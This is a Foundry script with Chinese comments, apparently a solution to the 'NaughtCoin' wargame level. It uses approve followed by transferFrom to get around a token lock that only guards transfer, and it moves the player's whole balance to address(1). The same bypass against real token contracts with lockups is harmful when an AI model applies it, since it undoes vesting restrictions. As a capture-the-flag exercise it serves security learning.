// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtCoinAttackScript is Script {
    function run() external {
        address naughtCoinLevel = 0x478d7486313437f31Ae7077569e3Caa07543CB96;

        vm.startBroadcast();

        address player = msg.sender; // broadcast 时 msg.sender = tx.origin = 你的钱包
        INaughtCoin coin = INaughtCoin(naughtCoinLevel);

        uint256 balance = coin.balanceOf(player);
        console.log("player balance before:", balance);

        // 1) player 授权自己花费全部余额
        coin.approve(player, balance);

        // 2) player 用 transferFrom 绕过 transfer 上的 lockTokens 修饰符
        //    这里把币转给 address(1) 作为黑洞地址；也可以转给任意非零地址
        coin.transferFrom(player, address(1), balance);


        vm.stopBroadcast();
        console.log("player balance after:", coin.balanceOf(player));
    
    }
}
